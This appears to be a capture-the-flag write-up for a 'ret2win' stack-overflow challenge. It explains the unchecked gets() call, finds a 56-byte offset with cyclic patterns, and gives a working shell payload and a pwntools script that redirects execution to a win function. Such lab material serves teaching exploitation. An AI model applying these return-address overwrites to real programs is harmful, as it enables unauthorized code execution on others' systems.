# Ret2win

Peoblem : Here this is a Stack Overflow problems where we have to take the root shell by exploiting vulnerable function in the code.

SOL : 

``` ./ret2win ```

![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/5f5916ce-f10b-4464-92c9-736aba62f9e4)

Here after checking the code from Ghidra.Here

gets(local_38);: This is the line where the vulnerability exists. The gets function reads a line of text entered by the user and stores it in the local_38 array. However, gets doesn't perform any bounds checking. This means if the user enters more than 43 characters (44 - 1 for the null terminator), the extra characters will overflow the local_38 array and potentially overwrite adjacent memory locations.

![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/09d58991-dcc0-4e38-833b-e05dc9dcf722)

Here is a another function Win. 
![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/603dd9d0-518c-4675-9e6b-54f0baab2e75)

So ,
``` cyclic 100```

All we ahve to do is we have to overflow the main funtion where in the return we will provide the address of win function and we can get the access of bash shell.

we got a segmentation fault here that means its burnable
![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/6640564e-ba3f-4388-a93c-d833e0dd0491)

andd the offset is 56

```cyclic -l 0x6161616161616168```

using ``nm ./ret2win`` we found wins address ```0000000000401216 T win```  so the Little Endian fo the address is ``` \x16\x12\x40\x00\x00\x00\x00\x00``

![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/772564d2-847e-4c69-956e-022fd88c0963)

now main bash to access the shell 


```(echo -e 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa\x16\x12\x40\x00\x00\x00\x00\x00' ; cat ) | ./ret2win ```

![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/13f8aa21-9436-4ddd-b1b6-0f52a035a4f1)

Script :

```
#!/usr/bin/python3

from pwn import *

elf = ELF('ret2win')

io = process('./ret2win')

payload = cyclic(56) + p64(elf.sym.win)

io.sendline(payload)

io.interactive()

```
